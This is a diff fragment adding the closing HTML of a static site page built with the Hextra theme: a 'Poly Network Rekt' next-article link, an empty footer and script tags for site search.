+        class="flex max-w-[50%] items-center gap-1 py-4 text-base font-medium text-gray-600 transition-colors [word-break:break-word] hover:text-primary-600 dark:text-gray-300 md:text-lg ltr:ml-auto ltr:pl-4 ltr:text-right rtl:mr-auto rtl:pr-4 rtl:text-left"
+      >Poly Network Rekt<svg class="inline h-5 shrink-0" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div>
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer bg-gray-100 pb-[env(safe-area-inset-bottom)] dark:bg-neutral-900 print:bg-transparent"><div
+    class="max-w-screen-xl mx-auto flex justify-center py-12 pl-[max(env(safe-area-inset-left),1.5rem)] pr-[max(env(safe-area-inset-right),1.5rem)] text-gray-600 dark:text-gray-400 md:justify-start"
+  >
+    <div class="flex w-full flex-col items-center sm:items-start">
+    </div>
+  </div>
+</footer>
+    
+  </body>
+  <script defer src="/js/main.js" integrity=""></script>
+
+
+<script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
+    <script defer src="/en.search.js" integrity=""></script>
+
+
+</html>
